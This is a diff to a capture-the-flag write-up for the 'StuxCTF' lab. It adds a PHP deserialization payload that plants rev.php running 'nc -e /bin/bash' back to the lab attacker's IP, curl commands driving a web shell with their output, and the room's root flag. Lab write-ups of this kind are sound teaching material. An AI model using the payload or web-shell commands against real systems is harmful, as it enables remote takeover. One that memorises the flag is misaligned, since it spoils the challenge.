@@ -221,7 +221,8 @@ unserialize(file_get_contents($file_name));<br />
 <br>
 
 ```bash
-:~/StuxCTF# curl -s http://stuxctf.thm//4731502893726489553913132817668435073257703root@ip-10-10-17-38:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=id"
+:~/StuxCTF# curl -s http://stuxctf.thm//4731502893726489553913132817668435073257703
+:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=id"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 :~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=pwd"
 /var/www/html/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
@@ -245,12 +246,41 @@ user.txt
 
 
 > 1.2. <em>root.txt </em><br><a id='1.2'></a>
->> <strong><code>______________f</code></strong><br>
+>> <strong><code>0028454003b42601548df551b738976c</code></strong><br>
 <p></p>
 
 
 <br>
 
+
+![image](https://github.com/user-attachments/assets/b189729e-218c-4211-bf58-3dfcfc8d57d3)
+
+<br>
+
+<p>O:4:"file":2:{s:4:"file";s:7:"rev.php";s:4:"data";s:56:"<?php shell_exec("nc -e /bin/bash 10.10.17.38 9999"); ?>";}</p>
+
+![image](https://github.com/user-attachments/assets/b7d6a743-1062-42ac-a676-6e5f1c643c8c)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/86a9bf48-d190-4b87-bcc2-b3a57d19ae61)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/a5edbf38-2cab-4d8d-87e8-2c0613b5303a)
+
+
+
+<br>
+
+
+![image](https://github.com/user-attachments/assets/22964415-a9b2-4100-8800-e46ef6ca3122)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/16d161d8-2de5-49b9-b076-e2621fba47c3)
+
+<br>
 
 
 
